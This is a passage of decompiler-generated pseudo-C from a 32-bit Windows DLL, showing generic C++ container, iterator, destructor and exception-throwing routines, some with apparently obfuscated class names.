  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1002D352(v4);
  return v2;
}

//----- (1002C307) --------------------------------------------------------
void __thiscall sub_1002C307(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_1002D352(v1);
}

//----- (1002C34F) --------------------------------------------------------
_DWORD *__thiscall sub_1002C34F(_DWORD *Block, char a2)
{
  sub_1002BE6B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C36E) --------------------------------------------------------
_DWORD *__thiscall sub_1002C36E(_DWORD *Block, char a2)
{
  *Block = &off_10094C24;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094C24: using guessed type int (__thiscall *off_10094C24)(void *Block, char);

//----- (1002C38E) --------------------------------------------------------
_DWORD *__thiscall sub_1002C38E(_DWORD *Block, char a2)
{
  *Block = &off_10094C44;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094C44: using guessed type int (__thiscall *off_10094C44)(void *Block, char);

//----- (1002C3AE) --------------------------------------------------------
_DWORD *__thiscall sub_1002C3AE(_DWORD *Block, char a2)
{
  sub_1002C0EF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C3CD) --------------------------------------------------------
_DWORD *__thiscall sub_1002C3CD(_DWORD *Block, char a2)
{
  *Block = &off_10094CFC;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094CFC: using guessed type int (__thiscall *off_10094CFC)(void *Block, char);

//----- (1002C3F2) --------------------------------------------------------
int __usercall sub_1002C3F2@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1002C423) --------------------------------------------------------
int __thiscall sub_1002C423(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1002C456) --------------------------------------------------------
int __usercall sub_1002C456@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1002C495) --------------------------------------------------------
_DWORD *__stdcall sub_1002C495(_DWORD *a1, int a2)
{
  *a1 = &off_10094C24;
  a1[1] = a2;
  *a1 = &off_10094D1C;
  sub_1002C94A(a1 + 2);
  a1[7] = 0;
  return a1;
}
// 10094C24: using guessed type int (__thiscall *off_10094C24)(void *Block, char);
// 10094D1C: using guessed type int (__thiscall *off_10094D1C)(void *Block, char);

//----- (1002C4D9) --------------------------------------------------------
BOOL __thiscall sub_1002C4D9(int this)
{
  return *(_DWORD *)(this + 28) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1002C4EC) --------------------------------------------------------
BOOL __thiscall sub_1002C4EC(_DWORD *this)
{
  return this[7] != 0;
}

//----- (1002C4F6) --------------------------------------------------------
int *__thiscall sub_1002C4F6(int *this)
{
  int v2; // eax
  _DWORD *v3; // eax

  v2 = (*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[7]);
  sub_10002C25((int *)(v2 + 4), this + 4);
  v3 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, this[7]);
  sub_1002C9BB(this + 5, v3);
  return this + 2;
}

//----- (1002C531) --------------------------------------------------------
void __thiscall sub_1002C531(_DWORD *this)
{
  ++this[7];
}

//----- (1002C535) --------------------------------------------------------
void __thiscall sub_1002C535(_DWORD *this)
{
  --this[7];
}

//----- (1002C539) --------------------------------------------------------
void __noreturn sub_1002C539()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1002C539: using guessed type void __noreturn sub_1002C539();
// 1002C539: using guessed type _DWORD pExceptionObject[2];

//----- (1002C556) --------------------------------------------------------
void __noreturn sub_1002C556()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1002C556: using guessed type void __noreturn sub_1002C556();
// 1002C556: using guessed type _DWORD pExceptionObject[2];

//----- (1002C573) --------------------------------------------------------
LONG __thiscall sub_1002C573(int *this)
{
  *this = (int)off_10094C20;
  sub_10001651(this + 3);
  return sub_1000CE59(this + 1);
}
// 10094C20: using guessed type int (__thiscall *off_10094C20[2])(void *Block, char);

//----- (1002C5A8) --------------------------------------------------------
_DWORD *__thiscall sub_1002C5A8(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10094CFC;
  a2[1] = this;
  *a2 = &off_10094D3C;
  a2[2] = a3;
  return result;
}
// 10094CFC: using guessed type int (__thiscall *off_10094CFC)(void *Block, char);
// 10094D3C: using guessed type int (__thiscall *off_10094D3C)(void *Block, char);

//----- (1002C5DC) --------------------------------------------------------
void __thiscall sub_1002C5DC(_DWORD *this)
{
  *this = &off_10094D3C;
  *this = &off_10094CFC;
}
// 10094CFC: using guessed type int (__thiscall *off_10094CFC)(void *Block, char);
// 10094D3C: using guessed type int (__thiscall *off_10094D3C)(void *Block, char);

//----- (1002C601) --------------------------------------------------------
bool __thiscall sub_1002C601(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1002C618) --------------------------------------------------------
BOOL __thiscall sub_1002C618(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1002C622) --------------------------------------------------------
int __thiscall sub_1002C622(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1002C65D) --------------------------------------------------------
int __thiscall sub_1002C65D(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1002C693) --------------------------------------------------------
int __thiscall sub_1002C693(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1002C6BB) --------------------------------------------------------
int __thiscall sub_1002C6BB(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1002C6F6) --------------------------------------------------------
int __thiscall sub_1002C6F6(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1002C712) --------------------------------------------------------
_DWORD *__thiscall sub_1002C712(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10094C44;
  a2[1] = this;
  *a2 = &off_10094D5C;
  a2[2] = a3;
  return result;
}
// 10094C44: using guessed type int (__thiscall *off_10094C44)(void *Block, char);
// 10094D5C: using guessed type int (__thiscall *off_10094D5C)(void *Block, char);

//----- (1002C746) --------------------------------------------------------
void __thiscall sub_1002C746(_DWORD *this)
{
  *this = &off_10094D5C;
  *this = &off_10094C44;
}
// 10094C44: using guessed type int (__thiscall *off_10094C44)(void *Block, char);
// 10094D5C: using guessed type int (__thiscall *off_10094D5C)(void *Block, char);

//----- (1002C76B) --------------------------------------------------------
bool __thiscall sub_1002C76B(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1002C782) --------------------------------------------------------
BOOL __thiscall sub_1002C782(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1002C78C) --------------------------------------------------------
int __thiscall sub_1002C78C(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1002C7C7) --------------------------------------------------------
int __thiscall sub_1002C7C7(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1002C7FD) --------------------------------------------------------
int __thiscall sub_1002C7FD(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1002C825) --------------------------------------------------------
int __thiscall sub_1002C825(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1002C860) --------------------------------------------------------
int __thiscall sub_1002C860(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1002C87C) --------------------------------------------------------
_DWORD *__thiscall sub_1002C87C(_DWORD *Block, char a2)
{
  sub_1002C8F9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C89C) --------------------------------------------------------
int *__thiscall sub_1002C89C(int *Block, char a2)
{
  sub_1002C573(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C8BB) --------------------------------------------------------
_DWORD *__thiscall sub_1002C8BB(_DWORD *Block, char a2)
{
  sub_1002C5DC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C8DA) --------------------------------------------------------
_DWORD *__thiscall sub_1002C8DA(_DWORD *Block, char a2)
{
  sub_1002C746(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002C8F9) --------------------------------------------------------
LONG __stdcall sub_1002C8F9(_DWORD *a1)
{
  LONG result; // eax

  result = sub_1002C573(a1 + 2);
  *a1 = &off_10094C24;
  return result;
}
// 10094C24: using guessed type int (__thiscall *off_10094C24)(void *Block, char);

//----- (1002C94A) --------------------------------------------------------
_DWORD *__stdcall sub_1002C94A(_DWORD *a1)
{
  *a1 = off_10094C20;
  sub_1000CC20(a1 + 1, word_10094BAC);
  sub_10001611(a1 + 3);
  return a1;
}
// 10094BAC: using guessed type wchar_t word_10094BAC[2];
// 10094C20: using guessed type int (__thiscall *off_10094C20[2])(void *Block, char);

//----- (1002C9BB) --------------------------------------------------------
_DWORD *__usercall sub_1002C9BB@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_1000186D((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1002C9EB) --------------------------------------------------------
int *__thiscall sub_1002C9EB(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_100017AA(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (1002CA30) --------------------------------------------------------
void __thiscall sub_1002CA30(_DWORD *this)
{
  char *v2; // eax

  *this = &off_10094C68;
  v2 = (char *)this[3];
  if ( v2 )
    sub_100017AA(v2);
  this[3] = 0;
  sub_1002C0EF(this);
}
// 10094C68: using guessed type int (__thiscall *off_10094C68)(void *Block, char);

//----- (1002CA82) --------------------------------------------------------
int __thiscall sub_1002CA82(_DWORD *this)
{
  return this[1];
}

//----- (1002CA86) --------------------------------------------------------
_DWORD *__thiscall sub_1002CA86(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  _DWORD *result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B6A47);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_1002C9BB((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  result = sub_1002C9BB((_DWORD *)(v7 + 8 * a3), a2);
  ++this[1];
  return result;
}

//----- (1002CAEC) --------------------------------------------------------
int __thiscall sub_1002CAEC(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (1002CB07) --------------------------------------------------------
int __thiscall sub_1002CB07(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6A4A);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_1002C9BB((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1002C9BB((_DWORD *)(this[3] + 8 * v4), dword_100BF9D4);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100BF9D4: using guessed type _DWORD dword_100BF9D4[2];

//----- (1002CB61) --------------------------------------------------------
int __thiscall sub_1002CB61(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6A4B);
  return this[3] + 8 * a2;
}

//----- (1002CB82) --------------------------------------------------------
int __thiscall sub_1002CB82(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6A52);
  return this[3] + 8 * a2;
}

//----- (1002CBA3) --------------------------------------------------------
char *__thiscall sub_1002CBA3(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_100017AA(v3);
  }
  return result;
}

//----- (1002CBCC) --------------------------------------------------------
int __thiscall sub_1002CBCC(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_100017AA(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1002CBF3) --------------------------------------------------------
BOOL __thiscall sub_1002CBF3(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1002CBFE) --------------------------------------------------------
int __thiscall sub_1002CBFE(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (**)(void))(*this + 4))(); ++i )
    sub_1002C9BB((_DWORD *)(this[3] + 8 * i), dword_100BF9D4);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 100BF9D4: using guessed type _DWORD dword_100BF9D4[2];

//----- (1002CC43) --------------------------------------------------------
unsigned int __thiscall sub_1002CC43(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6A53);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1002CCB5) --------------------------------------------------------
unsigned int __thiscall sub_1002CCB5(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1002CCDD) --------------------------------------------------------
unsigned int __stdcall sub_1002CCDD(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (1002CCF0) --------------------------------------------------------
unsigned int __thiscall sub_1002CCF0(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_1002D3A2, sub_10001651);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_1002C9BB((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (1002CD96) --------------------------------------------------------
void __thiscall sub_1002CD96(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // edi
  _DWORD *v9; // ebx
  char *i; // eax
  char *v11; // [esp+14h] [ebp-1Ch]
  int v12; // [esp+18h] [ebp-18h]
  _DWORD *v13; // [esp+1Ch] [ebp-14h]
  unsigned int v14; // [esp+20h] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v12 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v12 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v11 = (char *)this[3];
    v6 = (unsigned __int64)(unsigned int)v12 >> 29 != 0 ? -1 : 8 * v12;
    v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
    if ( v7 )
    {
      v8 = v7 + 1;
      *v7 = v12;
      `eh vector constructor iterator'(v7 + 1, 8u, v12, (void (__thiscall *)(void *))sub_1002D3A2, sub_10001651);
      v13 = v8;
    }
    else
    {
      v13 = 0;
    }
    v14 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v9 = v13;
      for ( i = (char *)(v11 - (char *)v13); ; i = (char *)(v11 - (char *)v13) )
      {
        sub_1002C9BB(v9, (_DWORD *)((char *)v9 + (_DWORD)i));
        ++v14;
        v9 += 2;
        if ( v14 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
    }
    this[3] = v13;
    if ( v11 )
      sub_100017AA(v11);
    this[2] = v12;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (1002CE9F) --------------------------------------------------------
_DWORD *__stdcall sub_1002CE9F(_DWORD *a1)
{
  sub_1002D3CB(a1);
  *a1 = &off_10094BBC;
  sub_10003AC0(a1 + 1, 0x10u);
  sub_1002D474(a1 + 5);
  return a1;
}
// 10094BBC: using guessed type int (__thiscall *off_10094BBC)(void *Block, char);

//----- (1002CEE4) --------------------------------------------------------
void __thiscall sub_1002CEE4(_DWORD *this)
{
  *this = &off_10094BBC;
  sub_1002CA30(this + 5);
  sub_10002CF0(this + 1);
  sub_1002BE6B(this);
}
// 10094BBC: using guessed type int (__thiscall *off_10094BBC)(void *Block, char);

//----- (1002CF2F) --------------------------------------------------------
bool __thiscall sub_1002CF2F(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  bool result; // al

  v3 = sub_1002D4B3(this, a2);
  result = 0;
  if ( v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3);
    if ( !sub_1000D0B5(a2, v4) )
      return 1;
  }
  return result;
}

//----- (1002CF6E) --------------------------------------------------------
char __thiscall sub_1002CF6E(_DWORD *this, int a2)
{
  int v3; // ebx
  int v4; // eax

  v3 = sub_1002D4B3(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    return 0;
  v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3);
  if ( sub_1000D0B5(a2, v4) )
    return 0;
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1002CFC2) --------------------------------------------------------
int __thiscall sub_1002CFC2(_DWORD *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD v7[4]; // [esp+10h] [ebp-14h] BYREF
  int v8; // [esp+20h] [ebp-4h]

  v3 = sub_1002D4B3(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), sub_1000D0B5(a2, v4)) )
  {
    (*(void (__thiscall **)(_DWORD *, int, int))(this[1] + 32))(this + 1, a2, v3);
    v5 = sub_10001611(v7);
    v8 = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[5] + 32))(this + 5, v5, v3);
    v8 = -1;
    sub_10001651(v7);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 1002CFC2: using guessed type _DWORD var_14[4];

//----- (1002D03A) --------------------------------------------------------
int __thiscall sub_1002D03A(_DWORD *this, int pExceptionObject)
{
  int v3; // esi
  int v4; // eax

  v3 = sub_1002D4B3(this, pExceptionObject);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3), sub_1000D0B5(pExceptionObject, v4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v3);
}

//----- (1002D094) --------------------------------------------------------
_DWORD *__thiscall sub_1002D094(_DWORD *this, _DWORD *a2)
{
  sub_10002C48(this + 1, a2);
  return a2;
}

//----- (1002D0C5) --------------------------------------------------------
_DWORD *__thiscall sub_1002D0C5(_DWORD *this, _DWORD *a2)
{
  sub_1002D426(this + 5, a2);
  return a2;
}

//----- (1002D0F6) --------------------------------------------------------
int __thiscall sub_1002D0F6(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
